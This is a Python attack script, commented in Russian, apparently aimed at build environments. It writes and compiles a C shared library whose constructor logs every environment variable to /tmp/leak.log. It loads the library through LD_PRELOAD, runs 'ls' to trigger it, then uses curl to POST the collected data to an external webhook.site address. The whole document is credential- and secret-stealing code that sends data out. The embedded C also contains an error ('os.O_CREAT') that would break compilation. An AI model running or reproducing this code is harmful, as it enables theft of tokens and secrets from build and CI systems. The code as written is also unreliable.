import os
import subprocess

def inject_ld_preload():
    cpp_code = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

__attribute__((constructor))
void init() {
    // Пишем в файл, который точно доступен
    int fd = open("/tmp/leak.log", O_WRONLY | os.O_CREAT | os.O_APPEND, 0666);
    extern char **environ;
    for (char **env = environ; *env != NULL; env++) {
        write(fd, *env, strlen(*env));
        write(fd, "\n", 1);
    }
    close(fd);
}
"""
    with open("/tmp/spy.cpp", "w") as f:
        f.write(cpp_code)

    # Компилируем в shared object
    # В билд-средах обычно есть gcc или clang
    try:
        subprocess.run(["g++", "-fPIC", "-shared", "-o", "/tmp/spy.so", "/tmp/spy.cpp"], check=True)
        
        # Активируем через переменную окружения для текущего процесса и всех дочерних
        os.environ["LD_PRELOAD"] = "/tmp/spy.so"
        
        # Теперь запускаем любую безобидную команду, например 'id' или 'ls'
        # Наша библиотека перехватит этот запуск
        subprocess.run(["ls", "/etc/resolv.conf"])
        
        # Читаем, что удалось собрать
        if os.path.exists("/tmp/leak.log"):
            with open("/tmp/leak.log", "r") as f:
                data = f.read()
                print("[+] Intercepted Data via LD_PRELOAD:\n", data[:500])
                
                # Отправляем на твой хук
                subprocess.run(['curl', '-s', '-X', 'POST', '-d', data, 'https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2'])
                
    except Exception as e:
        print(f"[-] Injection failed: {e}")

if __name__ == "__main__":
    inject_ld_preload()
